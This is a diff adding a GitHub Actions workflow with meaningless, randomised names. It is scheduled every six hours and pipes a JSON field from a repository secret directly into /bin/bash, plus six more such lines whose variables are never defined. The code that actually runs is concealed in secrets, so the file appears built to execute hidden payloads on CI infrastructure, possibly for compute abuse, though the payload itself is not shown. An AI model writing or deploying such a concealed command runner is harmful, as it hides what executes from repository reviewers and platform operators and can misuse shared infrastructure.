@@ -1,0 +1,24 @@
+name: nibanglewohaojicii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nibanglewohaojicii
+        env:
+          dqkr236: ${{ secrets.dqkr236 }}
+        run: |
+          echo $dqkr236 | jq -r .bqu9 | /bin/bash
+          echo $g8 | jq -r .iat8141 | /bin/bash
+          echo $o5 | jq -r .kxs5 | /bin/bash
+          echo $wd801 | jq -r .fct3132 | /bin/bash
+          echo $yw33 | jq -r .n83 | /bin/bash
+          echo $iz37 | jq -r .tydoy8580 | /bin/bash
+          echo $rbn96926 | jq -r .cid3369 | /bin/bash
+
